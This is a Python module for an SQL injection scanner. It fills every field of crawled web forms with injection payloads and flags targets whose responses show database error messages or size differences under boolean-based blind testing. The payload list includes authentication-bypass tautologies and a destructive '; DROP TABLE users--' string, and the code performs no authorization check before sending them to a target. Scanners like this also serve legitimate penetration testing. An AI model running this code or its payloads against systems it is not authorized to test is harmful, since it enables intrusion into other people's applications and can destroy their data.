import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore, Style

# Common SQL injection payloads
SQLI_PAYLOADS = [
    "'",
    "''",
    "`",
    "``",
    ",",
    "\"",
    "\"\"",
    "/",
    "//",
    "\\",
    "//",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "; DROP TABLE users--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
]

# DB error signatures to detect SQLi
ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "supplied argument is not a valid mysql",

    # MS Access / ASP
    "microsoft ole db provider for odbc drivers",
    "microsoft ole db provider for sql server",
    "odbc microsoft access driver",
    "microsoft jet database",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "syntax error in string in query expression",
    "data type mismatch in criteria expression",
    "[microsoft][odbc",
    "80040e14",
    "80040e07",
    "80040e21",

    # Oracle
    "ora-01756",
    "ora-00933",
    "sql command not properly ended",

    # Generic
    "syntax error",
    "invalid query",
    "sql error",
    "database error",
    "db error",
]

class SQLiScanner:
    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.session.headers["User-Agent"] = "WebVulnScanner/1.0"
        self.vulnerabilities = []

    def is_vulnerable(self, response):
        """Check if response contains SQL error signatures."""
        content = response.content.decode(errors="ignore").lower()
        for error in ERROR_SIGNATURES:
            if error in content:
                return True, error
        return False, None

    def check_blind_sqli(self, target_url, data, method):
        """
        Boolean-based blind SQLi — runs ONCE per form.
        Compares response sizes for TRUE vs FALSE conditions.
        """
        try:
            true_data  = {k: "1' OR '1'='1" for k in data}
            false_data = {k: "1' OR '1'='2" for k in data}

            if method == "post":
                true_resp  = self.session.post(target_url, data=true_data,  timeout=5)
                false_resp = self.session.post(target_url, data=false_data, timeout=5)
            else:
                true_resp  = self.session.get(target_url, params=true_data,  timeout=5)
                false_resp = self.session.get(target_url, params=false_data, timeout=5)

            true_len  = len(true_resp.content)
            false_len = len(false_resp.content)

            # Significant size difference = blind SQLi
            if abs(true_len - false_len) > 200:
                return True, true_len, false_len

        except Exception as e:
            print(f"{Fore.YELLOW}[BLIND CHECK ERROR]{Style.RESET_ALL} {e}")

        return False, 0, 0

    def scan_form(self, form, page_url):
        """Inject SQLi payloads into form fields and check for vulnerabilities."""
        action  = form.get("action", "")
        method  = form.get("method", "get").lower()
        inputs  = form.get("inputs", [])
        target_url = urljoin(page_url, action) if action else page_url

        # Build base data dict
        data = {}
        for input_field in inputs:
            if input_field["name"] is None:
                continue
            if input_field["type"] in ("text", "search", "email", "password"):
                data[input_field["name"]] = "test"
            else:
                data[input_field["name"]] = input_field["value"]

        # --- 1. Error-based SQLi (payload loop) ---
        found = False
        for payload in SQLI_PAYLOADS:
            injected = {k: payload for k in data}

            try:
                if method == "post":
                    response = self.session.post(target_url, data=injected, timeout=5)
                else:
                    response = self.session.get(target_url, params=injected, timeout=5)

                vulnerable, matched_error = self.is_vulnerable(response)

                if vulnerable:
                    result = {
                        "type"          : "SQL Injection (Error-based)",
                        "url"           : target_url,
                        "method"        : method.upper(),
                        "payload"       : payload,
                        "matched_error" : matched_error
                    }
                    self.vulnerabilities.append(result)
                    print(f"{Fore.RED}[VULNERABLE]{Style.RESET_ALL} Error-based SQLi found!")
                    print(f"  → URL     : {target_url}")
                    print(f"  → Method  : {method.upper()}")
                    print(f"  → Payload : {payload}")
                    print(f"  → Error   : {matched_error}\n")
                    found = True
                    break  # One confirmed hit per form is enough

                else:
                    print(f"{Fore.YELLOW}[TESTING]{Style.RESET_ALL} "
                          f"{target_url} | payload: {payload[:30]}")

            except Exception as e:
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {e}")

        # --- 2. Blind SQLi check (runs ONCE per form) ---
        if not found and data:
            blind, true_len, false_len = self.check_blind_sqli(target_url, data, method)
            if blind:
                result = {
                    "type"          : "SQL Injection (Blind)",
                    "url"           : target_url,
                    "method"        : method.upper(),
                    "payload"       : "Boolean-based blind",
                    "matched_error" : f"Size diff → true={true_len}B false={false_len}B"
                }
                self.vulnerabilities.append(result)
                print(f"{Fore.RED}[VULNERABLE]{Style.RESET_ALL} Blind SQLi detected!")
                print(f"  → URL   : {target_url}")
                print(f"  → Diff  : true={true_len}B | false={false_len}B\n")

    def scan(self, forms):
        """Scan all forms collected by the crawler."""
        print(f"\n{Fore.BLUE}{'='*50}")
        print(f"  SQL INJECTION SCAN — {len(forms)} forms found")
        print(f"{'='*50}{Style.RESET_ALL}\n")

        if not forms:
            print("No forms to scan.")
            return []

        for form in forms:
            page_url = form.get("page_url", "")
            print(f"{Fore.CYAN}[FORM]{Style.RESET_ALL} Scanning form on: {page_url}")
            self.scan_form(form, page_url)

        return self.vulnerabilities